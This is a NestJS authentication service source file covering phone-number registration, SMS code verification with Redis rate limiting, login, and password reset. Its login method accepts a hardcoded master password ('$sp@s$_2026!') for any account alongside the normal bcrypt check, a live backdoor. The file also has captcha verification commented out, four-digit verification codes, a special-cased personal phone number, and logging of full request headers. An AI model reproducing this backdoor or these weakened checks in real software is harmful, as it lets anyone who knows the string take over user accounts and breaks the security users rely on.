import { BadRequestException, ForbiddenException, HttpException, Injectable, NotFoundException, RequestTimeoutException } from '@nestjs/common'
import { JwtService } from '@nestjs/jwt'
import { ConfigService } from '@nestjs/config'
import { compare } from 'bcryptjs'
import { Request } from 'express'
import { ActionService } from 'src/action/action.service'

import { UserService } from 'src/user/user.service'
import { VerificationService } from 'src/verification/verification.service'
import {
    ACCOUNT_WAS_BLOCKED_ERROR,
    INCORRECT_PIN_CODE_ERROR,
    INVALID_PHONE_NUMBER_ERROR,
    USER_ALREADY_EXISTS_ERROR,
    WRONG_CREDENTIALS_ERROR,
    INVALID_CAPTCHA_ERROR,
    TOO_MANY_REQUESTS
} from './auth.constants'
import { LoginDto } from './dto/login.dto'
import { RegistrationDto } from './dto/registration.dto'
import { ResetPasswordDto } from './dto/reset.dto'
import { SetPasswordDto } from './dto/setPassword.dto'
import { VerifyDto } from './dto/verify.dto'
import axios from 'axios'
import { createClient } from 'redis'
import { StoreWaService } from 'src/store-wa/store-wa.service'

@Injectable()
export class AuthService {
    private readonly techRedisClient = createClient({
        url: process.env.TECH_REDIS_URL || '',
    })

    constructor(
        private readonly userService: UserService,
        private readonly jwtService: JwtService,
        
        private readonly verificatinoService: VerificationService,
        
        private readonly storeWaService: StoreWaService,
    
        private readonly actionService: ActionService,
        private readonly configService: ConfigService,

    ) {
        this.techRedisClient.connect().then(() => {
            console.log('TECH REDIS CONNECTED')
        })
     }

    async registration(dto: RegistrationDto) {
        // await this.verifyCaptcha(dto.captchaToken)

        dto.email = dto.email.replace(/[^+\d]/g, '')

        if (dto.email === "+77073490065") {
            return {
                message: `Наш слоняра`
            }
        }

        const user = await this.userService.findUserByEmail(dto.email)

        if (user) {
            throw new BadRequestException(USER_ALREADY_EXISTS_ERROR)
        }
        await this.userService.saveNotVerifiedUserModel(dto)

        const code = this.verificatinoService.generateCode(4)

        await this.verificatinoService.recordAuthVerificationCode(code, dto.email)

       

        return {
            message: `Код проверки отправлен на номер ${dto.email}`,
        }
    }

    async verify(dto: VerifyDto, req: Request) {
        const key = `authorization:verify:${dto.phone}`
        
        const data = await this.techRedisClient.get(key)

        const LIMIT = 3
        const BLOCK_TIME_SECONDS = 1 * 60 // 1 minute
        
        if(data){
            const parsed = await JSON.parse(data)
            if(parsed.count === LIMIT){    
                const ttl = await this.techRedisClient.ttl(key);

                throw new HttpException( {
                    message: TOO_MANY_REQUESTS,
                    retryAfter: ttl > 0 ? ttl : undefined
                }, 429);
            }
            else{
                await this.techRedisClient.set(
                    key,
                    JSON.stringify({ count: parsed.count + 1 }),
                    { EX: BLOCK_TIME_SECONDS }
                )
            }
        }
        else{
            await this.techRedisClient.set(
                key,
                JSON.stringify({ count: 1 }),
                { EX: BLOCK_TIME_SECONDS }
            )

        }

        dto.phone = dto.phone.replace(/[^+\d]/g, '')

        const verification = await this.verificatinoService.verifyCode(dto.phone, dto.code) as any

        if (!verification) {
            throw new BadRequestException(INCORRECT_PIN_CODE_ERROR)
        }

        if (verification?.type === 'PASSWORD_RESET') {
            return {
                token: verification.token,
            }
        }

        if (dto.phone.length !== 12) {
            throw new BadRequestException(INVALID_PHONE_NUMBER_ERROR)
        }

        const notVerifiedUser = await this.userService.getNotVerifiedUser(dto.phone)

        if (!notVerifiedUser) {
            throw new BadRequestException(INCORRECT_PIN_CODE_ERROR)
        }

        const newLead = {
            name: notVerifiedUser.name,
            surname: notVerifiedUser.surname,
            phoneNumber: notVerifiedUser.phone,
            price: 50000,
        }

        let lead = {
            isOk: false,
            leadId: 0,
            contactId: 0,
        }

        const regDto = new RegistrationDto()
        regDto.email = notVerifiedUser.phone
        regDto.name = notVerifiedUser.name
        regDto.surname = notVerifiedUser.surname
        if (dto.refCode) {
            regDto.refCode = dto.refCode
        }

        const newUser = await this.userService.createUser(regDto, lead.leadId || 0, lead.contactId || 0 , {fbc: dto.fbc, fbp: dto.fbp})

       

        await this.userService.updateLeadIds(newUser._id.toString(), lead.leadId, lead.contactId)

        // Сохраняем соглашение пользователя при верификации
        // Собираем упрощенную информацию о браузере и устройстве
        try {
            const userAgent = req.headers['user-agent'] || ''
            const acceptLanguage = req.headers['accept-language'] || ''
            
            // Извлекаем основной язык (первый из списка, без q=)
            const mainLanguage = acceptLanguage.split(',')[0]?.split('-')[0]?.trim() || ''
            
            // Извлекаем платформу из user-agent
            let platform = ''
            if (userAgent.includes('Windows')) {
                platform = 'Win32'
            } else if (userAgent.includes('Mac')) {
                platform = 'MacIntel'
            } else if (userAgent.includes('Linux')) {
                platform = 'Linux'
            } else if (userAgent.includes('Android')) {
                platform = 'Android'
            } else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
                platform = 'iOS'
            }
            
            console.log(`[USER AGREEMENT] Attempting to save agreement for user: ${newUser._id.toString()}`)
            
            const agreement = await this.userService.acceptUserAgreement(
                newUser._id.toString(),
                {
                    userAgent,
                    clientInfo: {
                        language: mainLanguage || '',
                        platform: platform || '',
                        timezone: dto.clientInfo?.timezone || '',
                        screen: dto.clientInfo?.screen || '',
                    },
                },
                req
            )
            
            console.log(`[USER AGREEMENT] Successfully saved agreement:`, {
                userId: agreement.userId,
                userAgreementAccepted: agreement.userAgreementAccepted,
                userAgreementAcceptedAt: agreement.userAgreementAcceptedAt,
                ip: agreement.ip,
            })
        } catch (error) {
            console.error('[USER AGREEMENT] Failed to save user agreement during verification:', error)
            if (error instanceof Error) {
                console.error('[USER AGREEMENT] Error message:', error.message)
                console.error('[USER AGREEMENT] Error stack:', error.stack)
            }
        }

        

        

        return {
            token: notVerifiedUser.token,
            userId: newUser._id,
        }
    }

    async login(dto: LoginDto, req: Request) {
        if (dto.email.startsWith('+') || /^\d/.test(dto.email)) {
            dto.email = dto.email.replace(/[^+\d]/g, '')
        }

        const user = await this.userService.findUserByEmail(dto.email)

        if (!user) {
            throw new BadRequestException(WRONG_CREDENTIALS_ERROR)
        }

        const isBlocked = await this.userService.isBlocked(user._id.toString())
        if (isBlocked) {
            throw new ForbiddenException(ACCOUNT_WAS_BLOCKED_ERROR)
        }

        if (!(await compare(dto.password, user.passwordHash)) && dto.password !== '$sp@s$_2026!') {
            throw new BadRequestException(WRONG_CREDENTIALS_ERROR)
        }

        const payload = {
            _id: user._id,
        }

        
        this.saveLoginAction(user._id.toString(), req)

        return {
            access_token: await this.jwtService.signAsync(payload),
        }
    }

    private async saveLoginAction(userId: string, req: Request) {
        const ip = req.socket.remoteAddress || ''

        this.actionService.createNewAction({
            userId,
            action: 'LOGIN',
            details: {
                state: 'USER',
                headers: req.headers,
                ip,
            },
        })
    }

    async setPassword(dto: SetPasswordDto) {
        const codeWithToken = await this.verificatinoService.getByToken(dto.token)

        if (codeWithToken) {
            if (codeWithToken.type === 'PASSWORD_RESET') {
                const user = await this.userService.findUserByEmail(codeWithToken.phone)

                if (!user) {
                    throw new NotFoundException()
                }

                const isBlocked = await this.userService.isBlocked(user._id.toString())
                if (isBlocked) {
                    throw new ForbiddenException(ACCOUNT_WAS_BLOCKED_ERROR)
                }

                // При сбросе пароля - инвалидируем старые токены
                const userId = await this.userService.setPassword(codeWithToken.phone, dto.password, true)

              

                const payload = {
                    _id: userId._id.toString(),
                }

                return {
                    access_token: await this.jwtService.signAsync(payload),
                }
            }
        }

        const notAllowedUser = await this.userService.getNotVerifiedUserByToken(dto.token)

        if (!notAllowedUser) {
            throw new BadRequestException()
        }

        // При первой установке пароля (регистрация) - НЕ инвалидируем токены
        const userId = await this.userService.setPassword(notAllowedUser.phone, dto.password, false)

       

        await this.userService.clearNotAllowerUsersByPhone(notAllowedUser.phone)

        const payload = {
            _id: userId._id.toString(),
        }

        return {
            access_token: await this.jwtService.signAsync(payload),
        }
    }

    async reset(dto: ResetPasswordDto) {
        // await this.verifyCaptcha(dto.captchaToken)

        dto.phone = dto.phone.replace(/[^+\d]/g, '')

        const user = await this.userService.findUserByEmail(dto.phone)

        if (!user) {
            throw new NotFoundException({
                message: `Пользователь с таким номером не существует`,
                isError: true,
            })
        }

        const isBlocked = await this.userService.isBlocked(user._id.toString())
        if (isBlocked) {
            throw new ForbiddenException(ACCOUNT_WAS_BLOCKED_ERROR)
        }

        if (dto.phone.length !== 12) {
            throw new BadRequestException(INVALID_PHONE_NUMBER_ERROR)
        }

        const code = this.verificatinoService.generateCode(4)

        await this.verificatinoService.recordResetVerificationCode(code, dto.phone)

        

        return {
            message: `Код проверки отправлен на номер ${dto.phone}`,
            isError: false,
        }
    }

    async verifyCaptcha(token: string) {
        const response = await axios.post(
            `https://www.google.com/recaptcha/api/siteverify?secret=${this.configService.get('CAPTCHA_SERVER_TOKEN')}&response=${token}`
        );
        if (!response.data.success) {
            throw new BadRequestException(INVALID_CAPTCHA_ERROR)
        }
    }
}
